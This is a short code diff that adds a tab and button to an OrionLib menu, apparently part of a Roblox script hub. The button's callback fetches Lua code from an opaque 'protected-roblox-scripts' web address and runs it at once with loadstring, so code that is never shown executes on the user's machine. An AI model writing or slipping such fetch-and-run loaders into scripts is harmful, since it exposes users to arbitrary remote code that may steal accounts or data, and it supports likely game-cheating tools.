@@ -51,3 +51,16 @@ OrionLib:Destroy()
 Name = <string> - The name of the button.
 Callback = <function> - The function of the button.
 ]]
+
+local Tab = Window:MakeTab({
+	Name = "Hours - Superrun110",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+Tab:AddButton({
+	Name = "WindUi",
+	Callback = function() loadstring(game:HttpGet("https://protected-roblox-scripts.onrender.com/9d0785ad54dc8ff1056769665ecb810e"))()
+wait(1)
+OrionLib:Destroy()
+  	end    
+})
